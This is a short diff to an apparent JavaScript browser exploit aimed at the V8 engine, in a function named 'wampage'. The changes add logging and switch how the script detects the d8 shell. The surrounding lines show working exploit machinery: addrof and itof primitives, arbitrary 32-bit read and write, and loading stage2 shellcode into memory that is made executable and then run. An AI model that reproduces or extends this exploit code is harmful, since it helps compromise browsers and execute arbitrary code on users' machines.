@@ -97,6 +97,8 @@ function wampage() {
 		floatarray[1] = itof(addrof(fast_double_elements_map), 8); // put a valid pointer back to make gc happy
 	}
 
+	log("[+] Set up arbread32/arbwrite32.").then(() => {
+
 	// load stage2 shellcode into page-aligned memory (RW memory for now, stage1 will make it RWX)
 	var big_shellcode = new Uint8Array(0x4000);
 	var buf_start = arbread32(arbread32(addrof(big_shellcode) + 4*2) + 4*3);
@@ -147,9 +149,13 @@ function wampage() {
 	myfunc();
 
 	// nested callbacks from my janky logging function, lol
-	});});});});});});});
+	});});});});});});});});
 }
 
-if (typeof window === "undefined") { // we're running in d8 instead of a real browser
+if (is_d8) {
 	wampage();
+} else {
+	window.onerror = function (msg, url, line) {
+		log(msg + " : " + url + " line " + line);
+	}
 }
